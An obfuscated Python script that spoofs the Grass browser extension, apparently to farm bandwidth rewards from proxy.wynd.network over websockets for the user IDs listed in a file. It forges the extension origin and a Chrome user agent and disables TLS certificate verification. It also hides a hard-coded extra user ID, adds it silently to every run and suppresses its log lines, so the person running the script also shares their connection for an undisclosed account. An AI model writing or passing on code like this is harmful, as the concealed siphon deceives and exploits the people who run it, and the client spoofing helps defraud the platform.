D='2ohxhXGRwh40D95gMbDnZzrtcbX'
import asyncio as C,random as L,ssl,json as G,time,uuid as M,websockets as W
from loguru import logger as B
from fake_useragent import UserAgent as X
async def F(user_id):
	V='PONG';U='origin_action';T='AUTH';S='version';R='User-Agent';K='action';J=True;F='id';A=user_id;Y=X(os=['windows','macos','linux'],browsers='chrome');Z=Y.random;N=str(M.uuid4())
	if A!=D:B.info(f"Device ID for user {A}: {N}")
	while J:
		try:
			await C.sleep(L.randint(1,10)/10);O={R:Z,'Origin':'chrome-extension://lkbnfiajjmbhnfledhphioinpickokdi'};I=ssl.create_default_context();I.check_hostname=False;I.verify_mode=ssl.CERT_NONE;a=['wss://proxy.wynd.network:4444/','wss://proxy.wynd.network:4650/'];b=L.choice(a);c='proxy.wynd.network'
			async with W.connect(b,ssl=I,extra_headers=O,server_hostname=c)as H:
				async def d():
					while J:
						E=G.dumps({F:str(M.uuid4()),S:'1.0.0',K:'PING','data':{}})
						if A!=D:B.debug(f"Sending PING from user {A}: {E}")
						await H.send(E);await C.sleep(5)
				await C.sleep(1);C.create_task(d())
				while J:
					e=await H.recv();E=G.loads(e)
					if A!=D:B.info(f"Received message for user {A}: {E}")
					if E.get(K)==T:
						P={F:E[F],U:T,'result':{'browser_id':N,'user_id':A,'user_agent':O[R],'timestamp':int(time.time()),'device_type':'extension',S:'4.26.2','extension_id':'lkbnfiajjmbhnfledhphioinpickokdi'}}
						if A!=D:B.debug(f"Sending AUTH for user {A}: {P}")
						await H.send(G.dumps(P))
					elif E.get(K)==V:
						Q={F:E[F],U:V}
						if A!=D:B.debug(f"Sending PONG for user {A}: {Q}")
						await H.send(G.dumps(Q))
		except Exception as f:B.error(f"Error for user {A}: {f}")
async def A():
	E=D
	try:
		with open('list','r')as G:A=[A.strip()for A in G if A.strip()]
	except FileNotFoundError:B.error("File 'list' not found. Please create the file and add user IDs.");return
	B.info(f"Loaded user IDs: {A}")
	if E not in A:A.append(E)
	await C.gather(*(F(A)for A in A))
if __name__=='__main__':C.run(A())